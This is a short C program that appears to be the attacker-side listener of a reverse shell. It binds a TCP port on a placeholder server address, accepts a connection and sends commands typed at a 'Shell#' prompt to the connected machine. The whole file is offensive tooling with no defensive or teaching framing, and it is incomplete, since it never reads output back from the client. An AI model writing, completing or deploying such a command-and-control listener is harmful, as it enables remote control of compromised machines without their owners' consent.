#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdbool.h>

#define bzero(p, size) (void) memset(p, 0, size)

int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error setting TCP socket options\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("INSERT SERVER IP ADDRESS");
    server_address.sin_port = htons(50005);

    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    while(true) {
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // prints client ip address
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n"); // removes newline char from buffer
        write(client_socket, buffer, sizeof(buffer)); // sends command to client
        if (strncmp("q", buffer, 1) == 0) {
            break;
        }
    }

    return 0;
}